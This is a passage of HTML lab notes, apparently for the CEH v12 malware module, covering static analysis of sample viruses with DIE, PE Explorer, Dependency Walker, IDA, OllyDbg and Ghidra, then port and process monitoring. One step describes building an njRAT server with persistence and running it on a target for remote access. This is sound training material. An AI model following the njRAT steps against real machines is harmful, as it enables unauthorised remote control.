(fireeye.com)</li></ul><ul id="d335d713-7827-4f58-b1ae-d856ccbae929" class="bulleted-list"><li style="list-style-type:circle"><strong>Strings</strong> (docs.microsoft.com)</li></ul><ul id="3e06c899-7b64-4be2-9f96-5680813b907d" class="bulleted-list"><li style="list-style-type:circle"><strong>Free EXE DLL Resource Extract</strong> (resourceextract.com)</li></ul><ul id="b926a62a-d845-44d4-b382-2bde696f674d" class="bulleted-list"><li style="list-style-type:circle"><strong>FileSeek</strong> (fileseek.ca)<br/><br/><br/></li></ul></li></ul></details></li></ul><ul id="6671bc9c-4859-40c2-a378-3889f02c18c8" class="toggle"><li><details open=""><summary>Analyze ELF Executable File using Detect It Easy (DIE)</summary><ul id="7085c547-dcc8-4722-8c7c-2a499bba3bd7" class="toggle"><li><details open=""><summary>Info</summary><p id="41d0474e-f014-482b-ac15-727cc93ee18a" class="">The Executable and Linkable Format (ELF) is a generic executable file format in Linux environment.</p><p id="344ae2be-f9bf-4559-8c67-379509f6deef" class="">It contains three main components including ELF header, sections, and segments. </p><p id="6181de48-b8d1-425b-a716-42067507860a" class="">Each component plays an independent role in the loading and execution of ELF executables. </p><p id="e985d801-98f8-4780-86f6-f28c4b7b2d5d" class="">The static analysis of an ELF file involves investigating an ELF executable file without running or installing it.</p><p id="2a847de0-e2d2-4435-9ccf-77545cc544c9" class="">Apart from the Windows, DIE is also available for Linux and Mac OS.</p><p id="d57fcd6d-8085-46f0-9935-0925e81e5c68" class="">It has a completely open architecture of signatures and can easily add its own algorithms for detecting or modifying the existing signatures. </p><p id="db61b797-6510-432c-ab41-c6eaad0336d2" class="">It detects a file’s compiler, linker, packer, etc. using a signature-based detection method.</p></details></li></ul><ul id="55baf85a-922b-4edf-ad1c-81817d963b78" class="toggle"><li><details open=""><summary>What you can do</summary><ul id="57fbf270-c36a-4d84-97f3-fe7e89e3353c" class="bulleted-list"><li style="list-style-type:disc">Go to <code><strong>CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Packaging and Obfuscation Tools\DIE</strong></code> and double-click <code><strong>die.exe</strong></code></li></ul><ul id="a34476b6-1bcd-4e20-9577-0283d92a8afc" class="bulleted-list"><li style="list-style-type:disc">Open a virus like <code><strong>CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\ELF Test File</strong></code></li></ul><ul id="7d1e38f9-ce34-4d85-95c1-e69496ca3548" class="bulleted-list"><li style="list-style-type:disc">It automatically scans the file and shows the Operating system, compiler and language details</li></ul><ul id="f39f498e-8c61-45b9-97c7-4b52763444b7" class="bulleted-list"><li style="list-style-type:disc">Click <code>File Info</code> to show md5 sha1, endianess etc</li></ul><ul id="d8703bee-19ef-4f1d-8e0c-21ce255230ea" class="bulleted-list"><li style="list-style-type:disc">Click <code>Hash</code> to show hashes</li></ul><ul id="9d4fd1e0-471e-4fec-87b0-30e2ed2e06be" class="bulleted-list"><li style="list-style-type:disc">Click <code>Entropy</code> to show entropy<br/><br/><br/></li></ul></details></li></ul><ul id="0821b0dd-7852-4d66-b621-5ac96f1f001a" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="6ec3515a-7a76-4ad7-b3fb-f2952a797e2d" class="bulleted-list"><li style="list-style-type:disc"><strong>Macro_Pack</strong> (github.com)</li></ul><ul id="0aae360e-bc3e-4619-9744-be6d7ee41227" class="bulleted-list"><li style="list-style-type:disc"><strong>UPX</strong> (upx.github.io)</li></ul><ul id="811d7fb9-facd-41fb-97d3-299d19c3db6f" class="bulleted-list"><li style="list-style-type:disc"><strong>ASPack</strong> (aspack.com)<br/><br/><br/></li></ul></details></li></ul></details></li></ul><ul id="9a3f2eea-9ea3-4e90-bfeb-80ee83d70550" class="toggle"><li><details open=""><summary>Find the Portable Executable (PE) info using PE Explorer</summary><p id="72677e79-090c-43c7-b543-8cd97dd86286" class="">The Portable Executable (PE) format is the executable file format used on Windows OSes that stores the information a Windows system requires to manage the executable code. </p><p id="e1622c4b-013e-4724-a684-ea3819706f01" class="">The PE stores metadata about the program, which helps in finding additional details of the file. </p><p id="498f54b5-f219-4984-88d0-90d1f9dfcb27" class="">For instance, the Windows binary is in PE format that consists of information such as time of creation and modification, import and export functions, compilation time, DLLs, and linked files, as well as strings, menus, and symbols.</p><p id="18cf7f58-391f-448d-bb72-94c07c2fd8d2" class="">
</p><ul id="9dc6100f-ae52-4c44-97e5-2db2432d2502" class="bulleted-list"><li style="list-style-type:disc">Install <code><strong>CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\PE Extraction Tools\PE Explorer\E.Explorer_setup.exe</strong></code></li></ul><ul id="4829a3f9-2133-47ec-8061-facfa2553502" class="bulleted-list"><li style="list-style-type:disc">Open a virus <code><strong>CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\Klez Virus Live!\face.exe</strong></code></li></ul><ul id="c77f860c-7daa-4aef-8d12-49137ce2d79e" class="toggle"><li><details open=""><summary><strong>HEADERS INFO</strong> section</summary><ul id="4e84e92a-3a04-4c88-a1d6-e0ff28fe540c" class="bulleted-list"><li style="list-style-type:disc">View and save a text report on the file headers information</li></ul><ul id="0dfeb969-6a93-4cd2-a6f0-c67d80c768bb" class="bulleted-list"><li style="list-style-type:disc">Modify the entry point value</li></ul><ul id="e2980b7d-a477-4360-b6f1-ac6c7afc16b4" class="bulleted-list"><li style="list-style-type:disc">Updates the value of the checksum in the header</li></ul><ul id="2dc7af23-41dc-4b01-9826-6392a455434d" class="bulleted-list"><li style="list-style-type:disc">Set flag bits in the file header characteristics field</li></ul><p id="809908ec-1913-4cf2-a58c-16c04e4ab4d2" class="">
</p></details></li></ul><ul id="1a91a896-a4d9-4e49-894a-8eb16859ab04" class="toggle"><li><details open=""><summary><strong>Data Directories icon </strong>from the menu bar</summary><figure id="80ca15b0-7b9c-4ad4-8381-f640bcc70810" class="image"><a href="https://labondemand.blob.core.windows.net/content/lab118313/2022-04-05_17-58-57.jpg"><img style="width:36px" src="https://labondemand.blob.core.windows.net/content/lab118313/2022-04-05_17-58-57.jpg"/></a></figure><p id="5db82ef5-69b0-47fe-a24f-4a89163ccf16" class="">This will provide you with the <strong>DATA DIRECTORIES </strong>information such as the ability to view and edit the virtual address and size of the chosen directory describing provisions of parts of the code.</p></details></li></ul><ul id="2fb490b1-44a8-4462-9f49-0193b4f3c684" class="toggle"><li><details open=""><summary><strong>Section Headers</strong> icon from the menu bar. </summary><p id="97e00ea4-1d78-4442-86a6-478ee2aea21e" class="">This will provide you with the <strong>SECTION HEADERS</strong> information, allowing you to view all sections and information about their location and size.<br/><br/><br/></p></details></li></ul><ul id="ae2feb0b-eb75-48b5-bea3-db3e4e1b49f5" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="fccb10a9-3615-4983-b2f9-4ae78ca5cbe1" class="bulleted-list"><li style="list-style-type:disc"><strong>Portable Executable Scanner</strong> (<strong>pescan</strong>) (tzworks.net)</li></ul><ul id="f103822b-2e80-4442-a0ab-ccdc371d97d0" class="bulleted-list"><li style="list-style-type:disc"><strong>Resource Hacker</strong> (angusj.com)</li></ul><ul id="6e41bbf9-4f7f-4957-9907-7b7e306a2bfe" class="bulleted-list"><li style="list-style-type:disc"><strong>PEView</strong> (aldeid.com)<br/><br/><br/></li></ul></details></li></ul></details></li></ul><ul id="2657fe7c-25ab-4b5e-851a-873a15e8125b" class="toggle"><li><details open=""><summary>Identify File Dependencies using Dependency Walker</summary><ul id="dbff1d48-1d5a-4ae4-9891-f0190641ff15" class="toggle"><li><details open=""><summary>Info</summary><p id="d0911178-ee95-43ae-bd0e-f437ba31bbff" class="">Any software program depends on the various inbuilt libraries of an OS that help in performing specified actions in a system. </p><p id="a675b3e3-0982-434f-9a93-c18eeb1a5f6d" class="">Programs need to work with internal system files to function correctly. </p><p id="54daa11f-e348-4e31-aca2-a0cf9d1ddc25" class="">Programs store their import and export functions in a kernel32.dll file. </p><p id="cbf28197-a060-424e-a070-acab772ae14e" class="">File dependencies contain information about the internal system files that the program needs to function properly; this includes the process of registration and location on the machine.</p><p id="6f2ddfed-97c2-42e5-9ba4-2eb26b7cc1ed" class="">Find the libraries and file dependencies, as they contain information about the run-time requirements of an application. </p><p id="3c0214ba-36a9-462e-9946-6bd5f7686866" class="">Then, check to find and analyze these files to provide information about the malware in the file. </p><p id="60b520e0-dcf4-4391-8a93-e3a5ebecc80b" class="">File dependencies include linked libraries, functions, and function calls. </p><p id="8139901f-6f63-47f9-a94b-f09c90af4c26" class="">Check the dynamically linked list in the malware executable file. </p><p id="ca9f51cf-9037-4b52-9589-745ee6654d74" class="">Finding out all library functions may allow guessing about what the malware program can do. </p><p id="381efe9b-57e0-40e6-a4d0-63860138bb3a" class="">You should know the various DLLs used to load and run a program.</p><p id="6b8440f7-52de-44f6-bcbc-7b795448374b" class="">Some of the standard DLLs are:</p><figure id="73090dde-9ebb-4bc9-80d2-0f51b1a9c2c2" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/image%201.png"><img style="width:377.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/image%201.png"/></a></figure></details></li></ul><ul id="640d398a-1e43-4949-9c2c-7e44fd3dd38e" class="toggle"><li><details open=""><summary>Open a file to examine</summary><ul id="e69ebe30-0be8-4ce8-ad4d-f90313d9e157" class="bulleted-list"><li style="list-style-type:disc">Go to <code>C</code><code><strong>EH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\File Dependency Checking Tools\Dependency Walker\depends.exe</strong></code></li></ul><ul id="c0356894-0d0d-4665-885d-de2feffe9c66" class="bulleted-list"><li style="list-style-type:disc">Select <code><strong>CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\Klez Virus Live!\snoopy.exe</strong></code></li></ul><ul id="3ab29cbf-249f-4649-aba8-af51425366b9" class="bulleted-list"><li style="list-style-type:disc">Ignore the error</li></ul><ul id="f96aa46e-9ea9-4474-ad22-1da111748fa5" class="bulleted-list"><li style="list-style-type:disc">Minimize all the DLL modules to see everything</li></ul></details></li></ul><ul id="ba0a7f2b-a48f-4fea-ae38-7e25ec559a96" class="toggle"><li><details open=""><summary>Examine a dll</summary><ul id="d5be2f20-1c03-42a6-b739-bc494f3a691b" class="bulleted-list"><li style="list-style-type:disc">Click on  <code>Kernel32.dll</code> to examine it</li></ul><ul id="2a7dec80-c4c3-445c-939b-57fcc70b5a6a" class="bulleted-list"><li style="list-style-type:disc">We can see the functions it uses on the right</li></ul></details></li></ul><ul id="f56a09d8-6b29-40e5-9c20-71e57ef76b1a" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="33fd06b4-e925-4861-a701-f8a975f99d64" class="bulleted-list"><li style="list-style-type:disc"><strong>Dependency-check</strong> (jeremylong.github.io)</li></ul><ul id="96efd424-8dd3-40af-974e-30536f92924c" class="bulleted-list"><li style="list-style-type:disc"><strong>Snyk</strong> (snyk.io)</li></ul><ul id="c9e683a7-1e01-4e6a-a438-aff0a1f4c59b" class="bulleted-list"><li style="list-style-type:disc"><strong>RetireJS</strong> (retirejs.github.io)</li></ul></details></li></ul></details></li></ul><ul id="25425f76-f0fe-40a6-8f32-3e693d1de46d" class="toggle"><li><details open=""><summary>Perform Malware Disassembly using IDA and OllyDbg</summary><p id="fda6db1a-52b7-4517-8569-5cec82fca2d5" class=""> Based on the reconstructed assembly code, you can inspect the program logic and recognize its threat potential.</p><p id="083d009a-bb00-4f11-a442-d0e10559428b" class="">The primary purpose of the IDA disassembler is to display the instructions actually executed by the processor in a symbolic representation called “assembly language.” </p><p id="9a99fe89-0c17-4ecc-b03a-e173f101b258" class="">However, in real life, things are not always simple due to obfuscation techniques</p><p id="10657de5-7aac-4556-bab9-ca400c2732a1" class=""><strong>OllyDbg</strong> OllyDbg is a debugger that emphasizes binary code analysis, which is useful when source code is unavailable.</p><p id="72382197-eb95-4fbe-b59c-8bf003834033" class="">
</p><ul id="f2ab3964-361c-42d1-84b3-145ba50e420f" class="bulleted-list"><li style="list-style-type:disc">Open <code>IDA Freeware</code> (Installer in <code><strong>CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Disassembling and Debugging Tools\IDA</strong></code><strong>)</strong></li></ul><ul id="0a0ec5aa-d290-4723-8e54-6825e57c0cc3" class="bulleted-list"><li style="list-style-type:disc">Open <code><strong>CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\Klez Virus Live!\face.exe</strong></code></li></ul><ul id="aede8745-eec0-49d2-8731-d78bbda9656e" class="bulleted-list"><li style="list-style-type:disc"><strong>Portable executable for 80386 (PE) [pe64.dll]</strong> option selected; click <strong>OK</strong></li></ul><ul id="e9bc6fb9-6b72-464f-a9dd-83c670f4efbe" class="bulleted-list"><li style="list-style-type:disc"><strong>IDA View-A</strong> section, right-click anywhere and choose <strong>Text view</strong> from the context menu to view the text information of the malicious file uploaded to IDA for analysis.</li></ul><ul id="d9a9e486-b655-4538-93b0-1c24f6b34de2" class="bulleted-list"><li style="list-style-type:disc">Go to <code><strong>CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Disassembling and Debugging Tools\IDA</strong></code></li></ul><ul id="9895849f-6752-49c5-9b89-9213d4aa6b68" class="bulleted-list"><li style="list-style-type:disc"> Copy the <code><strong>qwingraph.exe</strong></code> file and paste it in IDA’s installation location  <code><strong>C:\Program Files\IDA Freeware 7.7</strong></code><code>.</code></li></ul><ul id="19bfd3aa-87fd-4880-9b6e-bb67ad98fe4a" class="bulleted-list"><li style="list-style-type:disc">To see the flow of the file<ul id="8b68c1a4-9acb-4881-8207-7ef5bec66fe5" class="bulleted-list"><li style="list-style-type:circle">View → Graphs → Flow chart</li></ul></li></ul><ul id="d632a937-e074-4359-b130-5c8c9c582c2f" class="bulleted-list"><li style="list-style-type:disc">To see function and system calls<ul id="18c28739-6edb-4ae1-a496-2f4dd4db93e5" class="bulleted-list"><li style="list-style-type:circle">View → Graphs → Function calls</li></ul></li></ul><ul id="85274867-698f-4493-9d08-b8f697b4e0fb" class="bulleted-list"><li style="list-style-type:disc">To view a hex view of the file<ul id="389338a4-3204-41f7-b591-2051d10d07fd" class="bulleted-list"><li style="list-style-type:circle">Click <code>Hex View-1</code> tab</li></ul></li></ul><ul id="51548c30-33c9-43d7-bdc8-8ff97d199909" class="bulleted-list"><li style="list-style-type:disc">To view the structure of the file<ul id="26e882ee-a443-46dc-95a2-84fb11f36f77" class="bulleted-list"><li style="list-style-type:circle">Click the <code>Structures Tab</code></li></ul></li></ul><ul id="5c04ba3f-68ad-4963-b049-40cb288ffcb2" class="bulleted-list"><li style="list-style-type:disc"> Using OllyDgb<ul id="9130332c-9b44-47e6-b918-6ea0da445d42" class="bulleted-list"><li style="list-style-type:circle">Go to <code><strong>CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Disassembling and Debugging Tools\OllyDbg</strong></code> and double-click <code><strong>OLLYDBG.EXE</strong></code></li></ul><ul id="0bb60964-9d42-4623-87ea-c14cad7c2a7d" class="bulleted-list"><li style="list-style-type:circle">Open <code>C</code><code><strong>EH-Tools\CEHv12 Module 07 Malware Threats\Viruses\tini.exe</strong></code></li></ul><ul id="c03f14ce-cfbc-4324-85af-d3a8cbd45896" class="bulleted-list"><li style="list-style-type:circle">View the program entry point and its calls to known functions<ul id="8f10fdc9-f033-4e7c-93a1-aabb4fd9a10b" class="bulleted-list"><li style="list-style-type:square">Click View → Log</li></ul></li></ul><ul id="d1f23d7e-0f07-443c-9aba-4788d9cb40e9" class="bulleted-list"><li style="list-style-type:circle">View all executable modules<ul id="61571263-9927-44fb-b845-1b78fd521169" class="bulleted-list"><li style="list-style-type:square">Click View → Executable Modules</li></ul><ul id="5049c523-2371-41b6-ac31-b7ed80ff6b82" class="bulleted-list"><li style="list-style-type:square">Double-click any module to view the complete information of the selected module</li></ul></li></ul><ul id="1bede358-8636-4ebc-966c-3f5dd9c11952" class="bulleted-list"><li style="list-style-type:circle">View memory map of a module<ul id="1579fb6b-2a8b-4768-91fc-5a0f3e1d475f" class="bulleted-list"><li style="list-style-type:square">Choose any module in Executable Modules</li></ul><ul id="c3c5ac99-a7b7-42df-963e-0c6d3f39c256" class="bulleted-list"><li style="list-style-type:square">Go to View → Memory</li></ul></li></ul><ul id="d6b1a49c-5fac-47fe-bd88-e06397ee8e90" class="bulleted-list"><li style="list-style-type:circle">Show threads<ul id="12b41590-57a5-43da-8f91-8c13e15ff9f9" class="bulleted-list"><li style="list-style-type:square">View → Threads<br/><br/><br/></li></ul></li></ul></li></ul></details></li></ul><ul id="ef5bdf48-5274-426c-98a6-fb2d22a1baf1" class="toggle"><li><details open=""><summary>Perform Malware Disassembly using Ghidra</summary><p id="537d4c6d-4a8d-42e7-807f-ee0b90c0738b" class="">Ghidra is a software reverse engineering (SRE) framework that includes a suite of full-featured, high-end software analysis tools that enable users to analyze compiled code on a variety of platforms including Windows, MacOS, and Linux</p><p id="1ff20d5c-66f6-4c76-a096-e27a627c22d9" class="">
</p><ul id="0f535b74-860f-4fad-8f29-8b3ede04902c" class="toggle"><li><details open=""><summary>Load a file to analyze</summary><ul id="1b64971d-4929-430c-9903-0e1204b2fa2d" class="bulleted-list"><li style="list-style-type:disc">Run <code><strong>CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Disassembling and Debugging Tools\Ghidra\ghidraRun.bat</strong></code></li></ul><ul id="a81970b8-808e-41e8-a781-2d61f9af9ae7" class="bulleted-list"><li style="list-style-type:disc">Click <code>File -&gt; New Project</code></li></ul><ul id="5b905388-6eb7-4dac-a62c-243de5d665d0" class="bulleted-list"><li style="list-style-type:disc"><code>Non Shared Project</code></li></ul><ul id="196d8566-8c4f-45e8-bcf5-dc9e03163a6c" class="bulleted-list"><li style="list-style-type:disc">Set a project name and continue</li></ul><ul id="0e0b48c5-8dc2-4320-9433-7db6a11e9042" class="bulleted-list"><li style="list-style-type:disc"><code>File -&gt; Import File</code></li></ul><ul id="954114cc-cbbf-442e-be84-9cd9e6755d81" class="bulleted-list"><li style="list-style-type:disc">Import <code><strong>CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\Klez Virus Live!\face.exe</strong></code></li></ul><ul id="48d28cd8-14b3-4b13-be45-2a88d979f04b" class="bulleted-list"><li style="list-style-type:disc">Double click <code>face.exe</code> under your project folder and click <code>Analyze</code></li></ul></details></li></ul><ul id="43627b9e-45bf-4c94-b42f-85bc8f13effc" class="toggle"><li><details open=""><summary>Use analysis tools</summary><ul id="5e7cc77c-7496-4ca6-9376-45e42d7ea06c" class="bulleted-list"><li style="list-style-type:disc">On the left pane, at the <code><strong>Symbol Tree</strong></code>, you can observe various components of face.exe file such as Imports, Exports, Functions and Labels.</li></ul><ul id="77131cff-b612-4c3a-9d71-fb9ea0ca7779" class="bulleted-list"><li style="list-style-type:disc">Click to expand <code><strong>Imports</strong></code> node and you can view the DLL files of face.exe</li></ul><ul id="bcf341a1-34bc-4bc6-b7e0-2eb9daae77f0" class="bulleted-list"><li style="list-style-type:disc">In the left-pane, under <code><strong>Program Tree</strong></code>, double-click <code><strong>Headers</strong></code> node to jump to the header function in the code snippet.</li></ul><ul id="82c77d90-eef0-42ce-b3ab-3d6b43e638df" class="bulleted-list"><li style="list-style-type:disc">Similarly, double-click <code><strong>.rdata</strong></code> node to view the rdata function in the code snippet</li></ul></details></li></ul><ul id="ab2c96dc-3e54-41ed-92fd-2afb3156f185" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="01c7f40a-08e4-4418-aae8-4a78eea5c515" class="bulleted-list"><li style="list-style-type:disc"> <strong>Radare2</strong> (rada.re)</li></ul><ul id="b570eba8-8272-4458-b638-79e5196ecabb" class="bulleted-list"><li style="list-style-type:disc"><strong>WinDbg</strong> (windbg.org)</li></ul><ul id="3f5fc1aa-32e4-4faa-aa05-c29e4e4c35e1" class="bulleted-list"><li style="list-style-type:disc"><strong>ProcDump</strong> (docs.microsoft.com)<br/><br/><br/></li></ul></details></li></ul></details></li></ul></details></li></ul><ul id="6289e026-08ce-458d-996c-be5580ff88b1" class="toggle"><li><details open=""><summary>Dynamic Analysis</summary><p id="871a6051-7996-44ad-b790-e2572378a9d1" class="">Dynamic Malware Analysis, also known as behavioral analysis, involves executing malware code to learn how it interacts with the host system and its impact after infecting the system.</p><p id="d9d9474f-3a29-4417-b7ee-d19d33e85b61" class="">It reveals information such as domain names, file path locations, created registry keys, IP addresses, additional files, installation files, and DLL and linked files located on the system or network.</p><ul id="b790217a-588e-47ff-8474-8ddb10b879bb" class="toggle"><li><details open=""><summary>Basic Knowledge</summary><ul id="1cb1afe2-5a47-44f1-b1e9-4bce31321417" class="bulleted-list"><li style="list-style-type:disc"><strong>System Baselining</strong> Baselining refers to the process of capturing a system’s state (taking snapshot of the system) at the time the malware analysis begins. This can be used to compare the system’s state after executing the malware file, which will help understand the changes that the malware has made across the system. A system baseline involves recording details of the file system, registry, open ports, network activity, and other items.</li></ul><ul id="f18760ba-b9a0-4c45-bb29-9fa1c74fb9f3" class="bulleted-list"><li style="list-style-type:disc"><strong>Host Integrity Monitoring</strong> Host integrity monitoring is the process of studying the changes that have taken place across a system or a machine after a series of actions or incidents. It involves using the same tools to take a snapshot of the system before and after the incident or actions and analyzing the changes to evaluate the malware’s impact on the system and its properties. In malware analysis, host integrity monitoring helps to understand the runtime behavior of a malware file as well as its activities, propagation techniques, URLs accessed, downloads initiated, and other characteristics.<p id="28d3cb18-1441-4997-a6d0-c91fa17f5b4d" class="">Host integrity monitoring includes:</p><ul id="85dadf15-c8c3-41ac-95c9-8196ee09039c" class="bulleted-list"><li style="list-style-type:circle">Port monitoring</li></ul><ul id="e80593e7-9a2a-4a52-add2-71c1dd29fe55" class="bulleted-list"><li style="list-style-type:circle">Process monitoring</li></ul><ul id="50dfb88f-c3dd-4a41-8697-a30e950dbe4a" class="bulleted-list"><li style="list-style-type:circle">Registry monitoring</li></ul><ul id="2f92870a-92f7-48ab-9f32-b5c33fecd569" class="bulleted-list"><li style="list-style-type:circle">Windows services monitoring</li></ul><ul id="b7978afd-2683-46f9-9d17-8f61d5fc6e91" class="bulleted-list"><li style="list-style-type:circle">Startup program monitoring</li></ul><ul id="3eb2a2bc-230a-4e82-a22a-2e408ee95339" class="bulleted-list"><li style="list-style-type:circle">Event logs monitoring and analysis</li></ul><ul id="226e3ca2-ad54-4ac7-95f0-e045b12d449a" class="bulleted-list"><li style="list-style-type:circle">Installation monitoring</li></ul><ul id="14f5cb2f-85af-44c8-8bf8-b7b4ec79500f" class="bulleted-list"><li style="list-style-type:circle">Files and folder monitoring</li></ul><ul id="7a64c763-f6d5-48c4-abf7-c141b5df9471" class="bulleted-list"><li style="list-style-type:circle">Device driver monitoring</li></ul><ul id="0d087dd4-2b13-4697-9d1b-df041d477505" class="bulleted-list"><li style="list-style-type:circle">Network traffic monitoring and analysis</li></ul><ul id="c4a2f67b-7a5a-4c24-b840-f6805874a30a" class="bulleted-list"><li style="list-style-type:circle">DNS monitoring and resolution</li></ul><ul id="0c46c875-a671-4112-989c-878c923f4c65" class="bulleted-list"><li style="list-style-type:circle">API calls monitoring</li></ul></li></ul></details></li></ul><p id="c1d9cd31-01ea-48c0-b7b5-ebe85fee4217" class="">
</p><ul id="5179fa3c-7c80-47e4-ade1-e001cc6ef609" class="toggle"><li><details open=""><summary>Perform Port Monitoring using TCPView and CurrPorts</summary><p id="bba0be9f-8974-4b9a-82cb-2d8f1ab8bb0c" class="">Here, you will first create a server using njRAT, and then execute this server from the second machine. </p><p id="12814d77-226a-40fc-a2f5-6a50dc2bc035" class="">Later, you will run the TCPView and CurrPorts find that the process associated with the server is running on it.</p><p id="ed7ed460-91a0-403a-a07f-a9dfcaa079ff" class="">
</p><ul id="27ddd65d-3fea-47b1-8b48-35c872251d0e" class="toggle"><li><details open=""><summary>Launch njRAT</summary><ul id="1435b528-1557-4d73-b9b6-f52aa6bcabc7" class="bulleted-list"><li style="list-style-type:disc">Run <code>CEH-Tools\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\njRAT\njRAT v0.7d.exe</code></li></ul><ul id="0c455eb8-9aaa-4c2a-8def-820aa8e64ba3" class="bulleted-list"><li style="list-style-type:disc">Click <code>Start</code></li></ul><ul id="470cd7f7-5f53-43cb-a3de-884479344de7" class="bulleted-list"><li style="list-style-type:disc"> Click Builder and enter the IP address of attacker, check the option <strong>Registy StarUp</strong>, and click <strong>Build</strong>.</li></ul><ul id="de94c7bd-353c-4c17-bc9e-926214c2f906" class="bulleted-list"><li style="list-style-type:disc">Run it on target machine and gain remote access to attacker server<br/><br/><br/></li></ul></details></li></ul><ul id="371b18df-8d8e-46d7-a88a-64c55b80a07b" class="toggle"><li><details open=""><summary>Analyze using TPCView</summary><ul id="e82619bd-cee8-4db0-95d9-dc893bbd40d3" class="bulleted-list"><li style="list-style-type:disc">Run <code>CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Port Monitoring Tools\TCPView\Tcpview.exe</code></li></ul><ul id="2f22431b-89a5-4d82-8d2b-3b669f613cf1" class="bulleted-list"><li style="list-style-type:disc">The <strong>TCPView</strong> main window appears, displaying the details such as Process, ProcessId, Protocol, Local Address, Local Port, Remote Address, Remote Port, and State</li></ul><ul id="965b6b62-5897-4f0e-8c86-ca2065c92abe" class="bulleted-list"><li style="list-style-type:disc">You can search for something in the search bar and right click kill it</li></ul><ul id="0161f533-b4ee-4d9f-b4bd-ee89404823ea" class="bulleted-list"><li style="list-style-type:disc">If you are unable to stop a process, you can view the port on which it is running and add a firewall rule to block the port.</li></ul><ol type="1" id="ca06c8a3-c137-467b-bd6f-cd24ffffc78c" class="numbered-list" start="1"><li></li></ol></details></li></ul><ul id="5bb0f9e6-16f2-4a1a-b362-e6383965923d" class="toggle"><li><details open=""><summary>Analyze using CurrPorts</summary><ul id="4effb139-6f74-4e80-8dbc-8bef99600641" class="bulleted-list"><li style="list-style-type:disc">Go to <code><strong>CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Port Monitoring Tools\CurrPorts\cports.exe</strong></code></li></ul><ul id="d7a6a6ea-255e-43ad-9113-48a04eb105cd" class="bulleted-list"><li style="list-style-type:disc">You can find all the processes, their local and remote ports and remote IP connections</li></ul><ul id="46d9264d-34de-44bb-9bf1-4a28c57dca62" class="bulleted-list"><li style="list-style-type:disc"><code>Right Click → Properties</code> to view info such as user, date time process was created, sent and received bytes/packets</li></ul><ul id="6a75a998-625c-4409-9556-4cb7ae27a043" class="bulleted-list"><li style="list-style-type:disc">You can <code>Right Click → Kill Process</code></li></ul><ul id="3beb3517-5d88-4fb6-91ba-98540cfd60b2" class="bulleted-list"><li style="list-style-type:disc">You can <code>Right Click → Close TCP Connection</code></li></ul></details></li></ul><ul id="5c40b164-254e-45ee-ab67-ce7c5162c598" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="f5175fc1-d53a-472a-a38b-edffaa0a7a4d" class="bulleted-list"><li style="list-style-type:disc"><strong>Port Monitor</strong> (port-monitor.com)</li></ul><ul id="54487c16-dd0c-4d17-bb56-8293aa138e06" class="bulleted-list"><li style="list-style-type:disc"><strong>TCP Port Monitoring</strong> (dotcom-monitor.com)</li></ul><ul id="713756ad-5c90-41e6-bc55-45f4ba3e3b2a" class="bulleted-list"><li style="list-style-type:disc"><strong>PortExpert</strong> (kcsoftwares.com) </li></ul></details></li></ul><p id="de949dc3-f40a-4a18-a115-ddb316d71fe9" class="">
</p></details></li></ul><ul id="2e8be62f-ae43-4bc3-b31a-ddd3e725832e" class="toggle"><li><details open=""><summary>Perform Process Monitoring using Process Monitor</summary><ul id="583e179e-d2df-4cbf-b6da-b429b4da94fb" class="bulleted-list"><li style="list-style-type:disc">Run <code><strong>CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Process Monitoring Tools\ProcessMonitor\Procmon.exe</strong></code></li></ul><ul id="aa134273-1b57-4718-93a3-33087b205967" class="bulleted-list"><li style="list-style-type:disc">For each process you can <code>Right Click -&gt; Properties</code> to see:<ul id="baef6365-8aa7-4d0b-8851-2bcc30b5cbd7" class="bulleted-list"><li style="list-style-type:circle">On the <code>Event</code> tab: Date, Thread, Class, Operation, Result, Path, and Duration</li></ul><ul id="7560cbdf-8b8c-4be3-954b-b321c3423bb2" class="bulleted-list"><li style="list-style-type:circle">On the <code>Process</code> tab: other details</li></ul><ul id="3f8e6a7a-9c24-44b4-a992-79cc94f4f95e" class="bulleted-list"><li style="list-style-type:circle">On the <code>Stack</code> tab: the supported DLLs of the selected process</li></ul></li></ul><ul id="45b62d8e-fa0b-43e2-a2e2-7d4fdf66fc96" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="3a1b0205-f822-4df0-8696-f1f4ce3e1a6a" class="bulleted-list"><li style="list-style-type:disc"><strong>Process Explorer</strong> (docs.microsoft.com)</li></ul><ul id="3c36faa8-7348-4e07-a7f8-824ad99317a9" class="bulleted-list"><li style="list-style-type:disc"><strong>OpManager</strong> (manageengine.com)</li></ul><ul id="bd480423-0dbd-423b-bbda-0d442bb5d907" class="bulleted-list"><li style="list-style-type:disc"><strong>Monit</strong> (mmonit.com)</li></ul><ul id="735f9f6d-88e8-474d-b002-ff62098b41e0" class="bulleted-list"><li style="list-style-type:disc"><strong>ESET SysInspector</strong> (eset.com)<br/><br/><br/></li></ul></details></li></ul></details></li></ul><ul 